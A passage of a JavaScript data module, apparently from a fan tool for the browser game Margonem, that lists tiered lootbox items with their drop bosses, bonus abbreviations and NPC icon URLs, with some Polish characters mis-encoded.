    drop: [{
      nick: "Kochanka Nocy",
      lvl: 102,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/her/kochanka-nocy.gif"
    }, {
      nick: "Książe Kasim",
      lvl: 116,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/her/ksiaze-kasim.gif"
    }, {
      nick: "Święty Braciszek",
      lvl: 123,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/her/sw_braciszek.gif"
    }, {
      nick: "ZĹoty Roger",
      lvl: 135,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/her/szkielet_pirata.gif"
    }, {
      nick: "Baca bez Łowiec",
      lvl: 144,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/her/baca-bez-lowiec.gif"
    }, {
      nick: "Czarująca Atalia",
      lvl: 157,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/her/czarujaca-atalia.gif"
    }, {
      nick: "Obłąkany Łowca Orków",
      lvl: 165,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/her/oblakany_ac1dae9d.gif"
    }, {
      nick: "Lichwiarz Grauhaz",
      lvl: 177,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/her/lichwiarz_grauhaz.gif"
    }, {
      nick: "Viviana Nandin",
      lvl: 185,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/her/viv_nandin_i3bd1.gif"
    }, {
      nick: "Przeraza",
      lvl: 194,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/her/przeraza.gif"
    }]
  }, {
    tier: 2,
    id: 59458,
    name: "Solidna skrytka stalowej mocy",
    type: "legendary",
    stat: "amount=1;canpreview;cansplit=1;capacity=100;lootbox2=2939;opis=Zawiera losowy komponent, niezbędny do utworzenia symbolu ulepszającego ekwipunek na poziomie 101-200. Szansa na Stalowy komponent jest dwukrotnie większa od pozostałych.[br][br]Po otworzeniu skrzynki, łup staje się związany na stałe.;rarity=legendary",
    pr: 21,
    prc: "zl",
    cl: 16,
    icon: "bag/kuf_compontent_12.gif",
    drop: [{
      nick: "Miłośnik rycerzy",
      lvl: 108,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/blotniaki_milosnik_rycerzy.gif"
    }, {
      nick: "Borgoros Garamir III",
      lvl: 124,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/ingotia_minotaur-7a.gif"
    }, {
      nick: "Henry Kaprawe Oko",
      lvl: 131,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e1/pirat5b.gif"
    }, {
      nick: "WĂłjt FistuĹa",
      lvl: 144,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/goral-e2-wojt-fistula.gif"
    }, {
      nick: "Burkog Lorulk",
      lvl: 160,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/orkczd.gif"
    }, {
      nick: "Ziuggrael Strażnik KrĂłlowej",
      lvl: 170,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/praork_woj_elita.gif"
    }, {
      nick: "Wrzosera",
      lvl: 177,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/wrzosera-1b.gif"
    }, {
      nick: "Breheret Żelazny Łeb",
      lvl: 192,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/draki-breheret-1b.gif"
    }]
  }, {
    tier: 2,
    id: 59459,
    name: "Solidna skrytka ognistej mocy",
    type: "legendary",
    stat: "amount=1;canpreview;cansplit=1;capacity=100;lootbox2=2940;opis=Zawiera losowy komponent, niezbędny do utworzenia symbolu ulepszajÄcego ekwipunek na poziomie 101-200. Szansa na Ognisty komponent jest dwukrotnie większa od pozostałych.[br][br]Po otworzeniu skrzynki, łup staje się związany na staĹe.;rarity=legendary",
    pr: 21,
    prc: "zl",
    cl: 16,
    icon: "bag/kuf_compontent_08.gif",
    drop: [{
      nick: "Jertek Moxos",
      lvl: 105,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/moloch-jertek.gif"
    }, {
      nick: "Ĺowca czaszek",
      lvl: 112,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/alghul-czaszka-1a.gif"
    }, {
      nick: "Ifryt",
      lvl: 128,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/magradit_ifryt.gif"
    }, {
      nick: "Mistrz Worundriel",
      lvl: 139,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/worundriel02.gif"
    }, {
      nick: "Fodug Zolash",
      lvl: 150,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/fodug_zolash.gif"
    }, {
      nick: "Sheba Orcza Szamanka",
      lvl: 160,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/r_orc_sheba.gif"
    }, {
      nick: "Lusgrathera Królowa Pramatka",
      lvl: 175,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/prakrolowa.gif"
    }, {
      nick: "Pięknotka Mięsożerna",
      lvl: 189,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/zmutowana-roslinka.gif"
    }, {
      nick: "Mysiur MyĹwiórowy KrĂłl",
      lvl: 197,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/mysiur_myswiorowy_krol-1a.gif"
    }]
  }, {
    tier: 2,
    id: 59460,
    name: "Solidna skrytka lodowej mocy",
    type: "legendary",
    stat: "amount=1;canpreview;cansplit=1;capacity=100;lootbox2=2941;opis=Zawiera losowy komponent, niezbÄdny do utworzenia symbolu ulepszającego ekwipunek na poziomie 101-200. Szansa na Lodowy komponent jest dwukrotnie większa od pozostałych.[br][br]Po otworzeniu skrzynki, łup staje się związany na stałe.;rarity=legendary",
    pr: 21,
    prc: "zl",
    cl: 16,
    icon: "bag/kuf_compontent_10.gif",
    drop: [{
      nick: "MiĹoĹnik magii",
      lvl: 108,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/blotniaki_milosnik_magii.gif"
    }, {
      nick: "Morski potwór",
      lvl: 118,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/osmiornica-1b.gif"
    }, {
      nick: "Stworzyciel",
      lvl: 125,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/stworzyciel.gif"
    }, {
      nick: "Eol",
      lvl: 135,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/piaskowy_potwor-6a.gif"
    }, {
      nick: "Berserker Amuno",
      lvl: 148,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/amuno.gif"
    }, {
      nick: "Duch WĹadcy Klanów",
      lvl: 165,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/duch_wladcy_kl.gif"
    }, {
      nick: "Królowa Śniegu",
      lvl: 175,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/krolowa-sniegu.gif"
    }, {
      nick: "Ogr Stalowy Pazur",
      lvl: 183,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/ogr_stalowy_pazur-1a.gif"
    }, {
      nick: "Sadolia Nadzorczyni Hurys",
      lvl: 200,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/sekta-sadolia.gif"
    }]
  }, {
    tier: 2,
    id: 59461,
    name: "Solidna skrytka elektrycznej mocy",
    type: "legendary",
    stat: "amount=1;canpreview;cansplit=1;capacity=100;lootbox2=2942;opis=Zawiera losowy komponent, niezbędny do utworzenia symbolu ulepszającego ekwipunek na poziomie 101-200. Szansa na Elektryczny komponent jest dwukrotnie większa od pozostaĹych.[br][br]Po otworzeniu skrzynki, łup staje siÄ zwiÄzany na stałe.;rarity=legendary",
    pr: 21,
    prc: "zl",
    cl: 16,
    icon: "bag/kuf_compontent_18.gif",
    drop: [{
      nick: "Kambion",
      lvl: 101,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/kambion.gif"
    }, {
      nick: "Ozirus Władca Hieroglifów",
      lvl: 115,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/mumia-ozirus.gif"
    }, {
      nick: "Helga Opiekunka Rumu",
      lvl: 131,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/pirat-2b.gif"
    }, {
      nick: "Teściowa Rumcajsa",
      lvl: 145,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/goral-e2-tesciowa-rumcajsa.gif"
    }, {
      nick: "Adariel",
      lvl: 155,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/tri_adariel.gif"
    }, {
      nick: "Fursharag PoĹźeracz Umysłów",
      lvl: 170,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/praork_mag_elita.gif"
    }, {
      nick: "Chryzoprenia",
      lvl: 177,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/chryzoprenia-1a.gif"
    }, {
      nick: "Torunia Ankelwald",
      lvl: 186,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/thuz-patr1.gif"
    }]
  }, {
    tier: 2,
    id: 59462,
    name: "Solidna skrytka jadowej mocy",
    type: "legendary",
    stat: "amount=1;canpreview;cansplit=1;capacity=100;lootbox2=2943;opis=Zawiera losowy komponent, niezbędny do utworzenia symbolu ulepszającego ekwipunek na poziomie 101-200. Szansa na Jadowy komponent jest dwukrotnie wiÄksza od pozostaĹych.[br][br]Po otworzeniu skrzynki, łup staje się związany na staĹe.;rarity=legendary",
    pr: 21,
    prc: "zl",
    cl: 16,
    icon: "bag/kuf_compontent_16.gif",
    drop: [{
      nick: "MiĹoĹnik ĹowcĂłw",
      lvl: 108,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/blotniaki_milosnik_lowcow.gif"
    }, {
      nick: "Krab pustelnik",
      lvl: 124,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/krab_big3.gif"
    }, {
      nick: "Młody Jack Truciciel",
      lvl: 131,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/pirat01.gif"
    }, {
      nick: "Grubber Ochlaj",
      lvl: 136,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/grubber-ochlaj.gif"
    }, {
      nick: "Goons Asterus",
      lvl: 154,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/goons_asterus-1a.gif"
    }, {
      nick: "Bragarth MyĹliwy Dusz",
      lvl: 170,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/praork_low_elita.gif"
    }, {
      nick: "Cantedewia",
      lvl: 177,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/cantedewia-1a.gif"
    }, {
      nick: "Cerasus",
      lvl: 193,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/cerasus-1a.gif"
    }]
  }, {
    tier: 3,
    id: 59492,
    name: "CiÄĹźka skrytka mocy",
    type: "legendary",
    stat: "amount=1;canpreview;cansplit=1;capacity=100;lootbox2=2944;opis=Zawiera losowy komponent, niezbędny do utworzenia symbolu ulepszającego ekwipunek na poziomie 201-300.[br][br]Po otworzeniu skrzynki, łup staje się związany na staĹe.;rarity=legendary",
    pr: 21,
    prc: "zl",
    cl: 16,
    icon: "bag/kuf_compontent_13.gif",
    drop: [{
      nick: "Demonis Pan NicoĹci",
      lvl: 205,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/her/sekta_demon_cz_s.gif"
    }, {
      nick: "Mulher Ma",
      lvl: 214,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/her/mulher_ma.gif"
    }, {
      nick: "Vapor Veneno",
      lvl: 231,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/her/joziniec_bagienny.gif"
    }, {
      nick: "Dęborożec",
      lvl: 244,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/her/zwierz_kniei.gif"
    }, {
      nick: "Tepeyollotl",
      lvl: 258,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/her/tep_35ecb966.gif"
    }, {
      nick: "Widmo Triady",
      lvl: 265,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/her/trist2_widmo_triady.gif"
    }, {
      nick: "Negthotep Czarny Kapłan",
      lvl: 271,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/her/negthotep.gif"
    }, {
      nick: "MĹody Smok",
      lvl: 282,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/her/smokbarb.gif"
    }]
  }, {
    tier: 3,
    id: 59493,
    name: "CiÄĹźka skrytka stalowej mocy",
    type: "legendary",
    stat: "amount=1;canpreview;cansplit=1;capacity=100;lootbox2=2945;opis=Zawiera losowy komponent, niezbędny do utworzenia symbolu ulepszajÄcego ekwipunek na poziomie 201-300. Szansa na Stalowy komponent jest dwukrotnie większa od pozostałych.[br][br]Po otworzeniu skrzynki, Ĺup staje siÄ związany na stałe.;rarity=legendary",
    pr: 21,
    prc: "zl",
    cl: 16,
    icon: "bag/kuf_compontent_11.gif",
    drop: [{
      nick: "Gothardus Kolekcjoner Głów",
      lvl: 204,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/sekta-gothardus.gif"
    }, {
      nick: "Czempion Furboli",
      lvl: 210,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/forbol03.gif"
    }, {
      nick: "Tolypeutes",
      lvl: 245,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/bolita.gif"
    }, {
      nick: "Wabicielka",
      lvl: 260,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/trist2_wabicielka-1a.gif"
    }, {
      nick: "Chopesz",
      lvl: 267,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/chopesh2.gif"
    }, {
      nick: "Zorin",
      lvl: 300,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/wl-mrozu01.gif"
    }]
  }, {
    tier: 3,
    id: 59494,
    name: "Ciężka skrytka ognistej mocy",
    type: "legendary",
    stat: "amount=1;canpreview;cansplit=1;capacity=100;lootbox2=2946;opis=Zawiera losowy komponent, niezbędny do utworzenia symbolu ulepszającego ekwipunek na poziomie 201-300. Szansa na Ognisty komponent jest dwukrotnie większa od pozostaĹych.[br][br]Po otworzeniu skrzynki, łup staje siÄ związany na stałe.;rarity=legendary",
    pr: 21,
    prc: "zl",
    cl: 16,
    icon: "bag/kuf_compontent_07.gif",
    drop: [{
      nick: "Annaniel Wysysacz Marzeń",
      lvl: 204,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/sekta-annaniel.gif"
    }, {
      nick: "Marlloth Malignitas",
      lvl: 220,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/drider-marlloth.gif"
    }, {
      nick: "Terrozaur",
      lvl: 280,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/terrorzaur_pus.gif"
    }, {
      nick: "Cuaitl Citlalin",
      lvl: 250,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/maho-cuaitl.gif"
    }, {
      nick: "Pogardliwa Sybilla",
      lvl: 263,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/tri2_witch_e2.gif"
    }, {
      nick: "Artenius",
      lvl: 300,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/wl-mrozu03.gif"
    }]
  }, {
    tier: 3,
    id: 59496,
    name: "Ciężka skrytka lodowej mocy",
    type: "legendary",
    stat: "amount=1;canpreview;cansplit=1;capacity=100;lootbox2=2947;opis=Zawiera losowy komponent, niezbędny do utworzenia symbolu ulepszającego ekwipunek na poziomie 201-300. Szansa na Lodowy komponent jest dwukrotnie większa od pozostałych.[br][br]Po otworzeniu skrzynki, Ĺup staje siÄ zwiÄzany na staĹe.;rarity=legendary",
    pr: 21,
    prc: "zl",
    cl: 16,
    icon: "bag/kuf_compontent_09.gif",
    drop: [{
      nick: "Zufulus Smakosz Serc",
      lvl: 205,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/sekta-zufulus.gif"
    }, {
      nick: "Arytodam olbrzymi",
      lvl: 226,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/arytodam_olbrzymi-1b.gif"
    }, {
      nick: "Mocny Maddoks",
      lvl: 231,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/mocny_maddoks-1b.gif"
    }, {
      nick: "Quetzalcoatl",
      lvl: 258,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/quetzalcoatl-1a.gif"
    }, {
      nick: "Nymphemonia",
      lvl: 287,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/nymphemonia.gif"
    }]
  }, {
    tier: 3,
    id: 59497,
    name: "Ciężka skrytka elektrycznej mocy",
    type: "legendary",
    stat: "amount=1;canpreview;cansplit=1;capacity=100;lootbox2=2948;opis=Zawiera losowy komponent, niezbędny do utworzenia symbolu ulepszającego ekwipunek na poziomie 201-300. Szansa na Elektryczny komponent jest dwukrotnie wiÄksza od pozostałych.[br][br]Po otworzeniu skrzynki, łup staje się związany na stałe.;rarity=legendary",
    pr: 21,
    prc: "zl",
    cl: 16,
    icon: "bag/kuf_compontent_17.gif",
    drop: [{
      nick: "Bergermona Krwawa Hrabina",
      lvl: 204,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/sekta-bergermona.gif"
    }, {
      nick: "Al'diphrin Ilythirahel",
      lvl: 218,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/drow-aldiphrin-wladca.gif"
    }, {
      nick: "Fangaj",
      lvl: 235,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/grzyb-humanoid-1b.gif"
    }, {
      nick: "Neferkar Set",
      lvl: 274,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/szkiel_set.gif"
    }, {
      nick: "Vaenra Charkhaam",
      lvl: 280,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/bar_smoczyca.gif"
    }]
  }, {
    tier: 3,
    id: 59498,
    name: "Ciężka skrytka jadowej mocy",
    type: "legendary",
    stat: "amount=1;canpreview;cansplit=1;capacity=100;lootbox2=2949;opis=Zawiera losowy komponent, niezbędny do utworzenia symbolu ulepszającego ekwipunek na poziomie 201-300. Szansa na Jadowy komponent jest dwukrotnie większa od pozostałych.[br][br]Po otworzeniu skrzynki, łup staje siÄ związany na stałe.;rarity=legendary",
    pr: 21,
    prc: "zl",
    cl: 16,
    icon: "bag/kuf_compontent_15.gif",
    drop: [{
      nick: "Sataniel Skrytobójca",
      lvl: 204,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/sekta-sataniel.gif"
    }, {
      nick: "Arachniregina Colosseus",
      lvl: 214,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/regina-e2.gif"
    }, {
      nick: "Dendroculus",
      lvl: 240,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/dendroculus.gif"
    }, {
      nick: "Chaegd Agnrakh",
      lvl: 280,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/bar_smokoszef.gif"
    }, {
      nick: "Yaotl",
      lvl: 258,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/mahoplowca.gif"
    }, {
      nick: "Furion",
      lvl: 300,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/wl-mrozu02.gif"
    }]
  }];
}
export function getBonusShortName() {
  return {
    cleanse: "PO",
    facade: "FO",
    anguish: "KU",
    puncture: "PS",
    frenzy: "ES",
    retaliation: "AO",
    curse: "KL",
    glare: "OS",
    critred: "KO",
    holytouch: "DA",
    verycrit: "CK",
    lastheal: "OR"
  };
}
export function getDataIcons() {
  return {
    teleport: {
      "1741": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/krab_big3.gif",
      "3149": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/gobsamurai.gif",
      "2729": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/kobold07.gif",
      "2532": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/zbir-e2-zorg.gif",
      "7864": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/drider-marlloth.gif",
      "7375": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/stworzyciel.gif",
      "7369": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/krab_big3.gif",
      "2308": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/zbir-szczet.gif",
      "727": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/gobmag2.gif",
      "7693": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/ogr_stalowy_pazur-1a.gif",
      "7692": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/ogr_stalowy_pazur-1a.gif",
      "610": "https://micc.garmory-cdn.cloud/obrazki/npc/mez/npc393.gif",
      "344": "https://micc.garmory-cdn.cloud/obrazki/npc/kob/tunia.gif",
      "353": "https://micc.garmory-cdn.cloud/obrazki/npc/kob/tunia.gif",
      "1224": "https://micc.garmory-cdn.cloud/obrazki/npc/mez/tuz31.gif",
      "630": "https://micc.garmory-cdn.cloud/obrazki/npc/mez/tuz31.gif",
      "3361": "https://micc.garmory-cdn.cloud/obrazki/npc/kol/mamlambo_final2.gif",
      "3883": "https://micc.garmory-cdn.cloud/obrazki/npc/kol/bazyliszek.gif",
      "7353": "https://micc.garmory-cdn.cloud/obrazki/npc/kol/kolos-wodnik.gif",
      "1739": "https://micc.garmory-cdn.cloud/obrazki/npc/kol/kolos-wodnik.gif",
      "4046": "https://micc.garmory-cdn.cloud/obrazki/npc/kol/soploreki.gif",
      "4066": "https://micc.garmory-cdn.cloud/obrazki/npc/kol/hydrokora.gif",
      "3535": "https://micc.garmory-cdn.cloud/obrazki/npc/kol/hydrokora.gif",
      "264": "https://micc.garmory-cdn.cloud/obrazki/npc/kol/hydrokora.gif",
      "4161": "https://micc.garmory-cdn.cloud/obrazki/npc/kol/kolos-wazka.gif",
      "1876": "https://micc.garmory-cdn.cloud/obrazki/npc/kol/kolos-wazka.gif",
      "4196": "https://micc.garmory-cdn.cloud/obrazki/npc/kol/kolkrucz.gif",
      "4206": "https://micc.garmory-cdn.cloud/obrazki/npc/kol/kolos-pajak.gif",
      "1131": "https://micc.garmory-cdn.cloud/obrazki/npc/kol/kolos-pajak.gif",
      "4266": "https://micc.garmory-cdn.cloud/obrazki/npc/kol/kolos-dendro.gif",
      "4268": "https://micc.garmory-cdn.cloud/obrazki/npc/kol/kolos-drakolisz.gif",
      "6949": "https://micc.garmory-cdn.cloud/obrazki/npc/tyt/renegat_baulus.gif",
      "189": "https://micc.garmory-cdn.cloud/obrazki/npc/tyt/dziewicza_orlica.gif",
      "1746": "https://micc.garmory-cdn.cloud/obrazki/npc/tyt/zabojczy_krolik.gif",
      "7060": "https://micc.garmory-cdn.cloud/obrazki/npc/tyt/archdemon.gif",
      "7477": "https://micc.garmory-cdn.cloud/obrazki/npc/tyt/versus-zoons.gif",
      "7475": "https://micc.garmory-cdn.cloud/obrazki/npc/tyt/versus-zoons.gif",
      "6477": "https://micc.garmory-cdn.cloud/obrazki/npc/tyt/lowcz-wspo-driady.gif",
      "6476": "https://micc.garmory-cdn.cloud/obrazki/npc/tyt/przyz_demon_sekta.gif",
      "7848": "https://micc.garmory-cdn.cloud/obrazki/npc/tyt/maddok_magua-1b.gif",
      "5709": "https://micc.garmory-cdn.cloud/obrazki/npc/tyt/tezcatlipoca.gif",
      "3312": "https://micc.garmory-cdn.cloud/obrazki/npc/tyt/hebrehoth_smokoludzie.gif",
      "2355": "https://micc.garmory-cdn.cloud/obrazki/npc/tyt/ice_king.gif",
      "177": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/glut_agar.gif",
      "229": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/kambion.gif",
      "7057": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/magradit_ifryt.gif",
      "7069": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/mumia-ozirus.gif",
      "1525": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/pirat-2b.gif",
      "1527": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/pirat-2b.gif",
      "3409": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/pirat01.gif",
      "1526": "https://micc.garmory-cdn.cloud/obrazki/npc/e1/pirat5b.gif",
      "5941": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/sekta-gothardus.gif",
      "5940": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/sekta-sadolia.gif",
      "5945": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/sekta-bergermona.gif",
      "7694": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/sekta-sataniel.gif",
      "7695": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/sekta-sataniel.gif",
      "8181": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/grzyb-humanoid-1b.gif",
      "8180": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/grzyb-humanoid-1b.gif",
      "5943": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/sekta-zufulus.gif",
      "6956": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/grubber-ochlaj.gif",
      "6955": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/grubber-ochlaj.gif",
      "6944": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/blotniaki_milosnik_rycerzy.gif",
      "6946": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/blotniaki_milosnik_magii.gif",
      "6945": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/blotniaki_milosnik_lowcow.gif",
      "1238": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/krolowa-sniegu.gif",
      "7345": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/krolowa-sniegu.gif",
      "6938": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/moloch-jertek.gif",
      "5872": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/duch_wladcy_kl.gif",
      "1912": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/forbol03.gif",
      "2063": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/draki-breheret-1b.gif",
      "7701": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/mysiur_myswiorowy_krol-1a.gif",
      "7827": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/arytodam_olbrzymi-1b.gif",
      "7859": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/drow-aldiphrin-wladca.gif",
      "1481": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/maddok5.gif",
      "1142": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/regina-e2.gif",
      "1159": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/regina-e2.gif",
      "5660": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/bolita.gif",
      "1462": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/maddok_roz.gif",
      "7843": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/mocny_maddoks-1b.gif",
      "3597": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/dendroculus.gif",
      "6634": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/dlawiciel5.gif",
      "6636": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/dlawiciel5.gif",
      "3039": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/szkiel_set.gif",
      "7465": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/worundriel02.gif",
      "7466": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/worundriel02.gif",
      "3627": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/silvanasus.gif",
      "5694": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/mahoplowca.gif",
      "3466": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/ugrape2.gif",
      "2761": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/goral05.gif",
      "1101": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/goral08.gif",
      "5855": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/orkczd.gif",
      "5856": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/orkczd.gif",
      "5849": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/r_orc_sheba.gif",
      "6064": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/nymphemonia.gif",
      "6063": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/nymphemonia.gif",
      "3035": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/chopesh2.gif",
      "4056": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/tri2_witch_e2.gif",
      "3339": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/bar_smoczyca.gif",
      "3327": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/terrorzaur_pus.gif",
      "2356": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/wl-mrozu02.gif",
      "2354": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/wl-mrozu01.gif",
      "2353": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/wl-mrozu03.gif",
      "3335": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/terrorzaur_pus.gif",
      "1901": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/maho-cuaitl.gif",
      "6053": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/thuz-patr1.gif",
      "1641": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/minotaur-elita.gif",
      "2526": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/ogr_drapak.gif",
      "2766": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/marlloth.gif",
      "3409": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/pirat01.gif",
